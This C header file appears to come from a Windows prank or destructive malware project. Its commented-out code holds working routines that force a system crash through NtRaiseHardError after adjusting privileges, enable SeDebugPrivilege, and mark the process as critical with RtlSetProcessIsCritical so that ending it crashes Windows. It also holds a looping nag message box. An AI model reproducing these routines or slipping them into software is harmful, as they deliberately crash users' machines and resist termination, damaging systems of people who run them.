typedef struct IUnknown IUnknown;
#pragma once

#include "mif.h"

//typedef NTSTATUS(WINAPI* NTRAISEHARDERROR)(NTSTATUS, DWORD, DWORD, PULONG_PTR, DWORD, PDWORD);
//typedef NTSTATUS(WINAPI* RTLADJUSTPRIVILEGE)(DWORD, BYTE, BYTE, LPBYTE);
//typedef void(_stdcall* RTLPROCESSCRITICAL) (IN BYTE NewValue, OUT LPBYTE OldValue, IN BYTE IsWinlogon);

/*void RaiseError(NTSTATUS ntExitCode, bool ifCustom, LPCSTR lpCustomMessage) {
	NTRAISEHARDERROR nrhe = (NTRAISEHARDERROR)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
	RTLADJUSTPRIVILEGE rtlap = (RTLADJUSTPRIVILEGE)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	BYTE ntbyte;
	DWORD dwRsp;
	rtlap(19, true, false, &ntbyte);
	if (ifCustom == true) {
	
	ULONG_PTR ulArguments[] = {(ULONG_PTR)lpCustomMessage};
	nrhe(ntExitCode, 0, 0, (PULONG_PTR)ulArguments, 6, &dwRsp);
	}
	else if (ifCustom == false) {
		nrhe(ntExitCode, 0, 0, 0, 6, &dwRsp);
	}
}

WINBOOL EnablePrivs(LPCWSTR lpprivs) {
	HANDLE htk;
	LUID luid;
	TOKEN_PRIVILEGES token;
	RtlZeroMemory(&token, sizeof(token));
	
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY), &htk)) return false;
	if (!LookupPrivilegeValueW(NULL, lpprivs, &luid)) {
		CloseHandle(htk);
		return false;
	}
	
	token.PrivilegeCount = 1;
	token.Privileges[0].Luid = luid;
	token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	BOOL bret = AdjustTokenPrivileges(htk, false, &token, sizeof(token), NULL, NULL);
	CloseHandle(htk);
	return bret;
}
		
WINBOOL SetCritProcess(void) {
		HANDLE hlib;
		RTLPROCESSCRITICAL SetCritiProcess;
		
		hlib = LoadLibraryW(L"ntdll.dll");
		if (hlib != NULL) {
			EnablePrivs(L"SeDebugPrivilege");
			(SetCritiProcess) = (RTLPROCESSCRITICAL)GetProcAddress((HINSTANCE)hlib, "RtlSetProcessIsCritical");
			if (!SetCritiProcess) return 0;
			SetCritiProcess(1, 0, 0);
			return 1;
		}
		else return 0;
}*/

/*DWORD WINAPI Message(LPVOID pvoid) {
		while (true) {
			MessageBox(NULL, GetDir(), GetDir(), MB_ICONWARNING | MB_OK);
			Sleep(1000 * 60 * 69);
		}
		return 0x00;
}*/ 


